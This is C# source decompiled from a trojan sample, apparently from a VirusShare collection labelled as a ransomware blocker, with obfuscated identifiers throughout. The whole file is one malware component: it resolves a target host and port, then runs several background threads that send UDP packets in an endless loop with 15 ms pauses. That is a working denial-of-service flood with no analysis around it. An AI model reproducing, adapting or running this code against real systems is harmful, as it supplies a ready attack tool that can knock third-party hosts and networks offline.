// Decompiled with JetBrains decompiler
// Type: ..
.		
// Assembly: System, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BCD7F698-81A9-45B6-B776-A5010DB561F8
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-79d9011ecd8a8c2b249f5f7f02fc71d724d9db23b2ea3aa0a787370b0766ca61.exe

using \u0001\u000E\u0003\u0004.\u0002\u0003\u0002\u000E\u0006\u000E.\u000A\u000B\u0005;
using System.ComponentModel;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace \u0001\u000E\u0003\u0004.\u0002\u0003\u0002\u000E\u0006\u000E.\u000A\u000B\u0005
{
  internal class \u0002\u0009\u000D\u0009\u0010\u0005
  {
    private static IPEndPoint \u0010\u000A\u0003\u0001;
    private static BackgroundWorker[] \u0002\u0005\u0007\u0011\u0007;
    private static byte[] \u0006\u000F\u000F;
    private static bool \u000B\u0007 = false;
    public static string \u000A\u0010\u0009 = string.Empty;
    public static ushort \u0002\u0006 = 0;
    public static int \u0001\u000F\u000B = 0;
    private static int \u000B\u0002\u0005\u000F\u0009 = 2;

    public static void \u0004\u0003()
    {
      try
      {
        \u0002\u0009\u000D\u0009\u0010\u0005.\u0010\u000A\u0003\u0001 = new IPEndPoint(Dns.GetHostEntry(\u0002\u0009\u000D\u0009\u0010\u0005.\u000A\u0010\u0009).AddressList[0], (int) \u0002\u0009\u000D\u0009\u0010\u0005.\u0002\u0006);
      }
      catch
      {
        \u0002\u0009\u000D\u0009\u0010\u0005.\u0010\u000A\u0003\u0001 = new IPEndPoint(IPAddress.Parse(\u0002\u0009\u000D\u0009\u0010\u0005.\u000A\u0010\u0009), (int) \u0002\u0009\u000D\u0009\u0010\u0005.\u0002\u0006);
      }
      \u0002\u0009\u000D\u0009\u0010\u0005.\u0006\u000F\u000F = new byte[\u0002\u0009\u000D\u0009\u0010\u0005.\u0001\u000F\u000B];
      \u0002\u0009\u000D\u0009\u0010\u0005.\u0002\u0005\u0007\u0011\u0007 = new BackgroundWorker[\u0002\u0009\u000D\u0009\u0010\u0005.\u000B\u0002\u0005\u000F\u0009];
      \u0002\u0009\u000D\u0009\u0010\u0005.\u000B\u0007 = true;
      for (int index = 0; index < \u0002\u0009\u000D\u0009\u0010\u0005.\u000B\u0002\u0005\u000F\u0009; ++index)
      {
        \u0002\u0009\u000D\u0009\u0010\u0005.\u0002\u0005\u0007\u0011\u0007[index] = new BackgroundWorker();
        \u0002\u0009\u000D\u0009\u0010\u0005.\u0002\u0005\u0007\u0011\u0007[index].DoWork += new DoWorkEventHandler(\u0002\u0009\u000D\u0009\u0010\u0005.\u0006);
        \u0002\u0009\u000D\u0009\u0010\u0005.\u0002\u0005\u0007\u0011\u0007[index].WorkerSupportsCancellation = true;
        \u0002\u0009\u000D\u0009\u0010\u0005.\u0002\u0005\u0007\u0011\u0007[index].RunWorkerAsync();
      }
    }

    public static void \u0006\u000B\u0002\u0008()
    {
      try
      {
        \u0002\u0009\u000D\u0009\u0010\u0005.\u000B\u0007 = false;
        for (int index = 0; index < \u0002\u0009\u000D\u0009\u0010\u0005.\u000B\u0002\u0005\u000F\u0009; ++index)
        {
          \u0002\u0009\u000D\u0009\u0010\u0005.\u0002\u0005\u0007\u0011\u0007[index].CancelAsync();
          \u0002\u0009\u000D\u0009\u0010\u0005.\u0002\u0005\u0007\u0011\u0007[index] = (BackgroundWorker) null;
        }
      }
      catch
      {
      }
    }

    private static void \u0006(object _param0, DoWorkEventArgs A_1)
    {
      Socket socket = new Socket(\u0002\u0009\u000D\u0009\u0010\u0005.\u0010\u000A\u0003\u0001.AddressFamily, SocketType.Dgram, ProtocolType.Udp);
      while (\u0002\u0009\u000D\u0009\u0010\u0005.\u000B\u0007)
      {
        try
        {
          socket.SendTo(\u0002\u0009\u000D\u0009\u0010\u0005.\u0006\u000F\u000F, (EndPoint) \u0002\u0009\u000D\u0009\u0010\u0005.\u0010\u000A\u0003\u0001);
          Thread.Sleep(15);
        }
        catch
        {
        }
      }
    }
  }
}
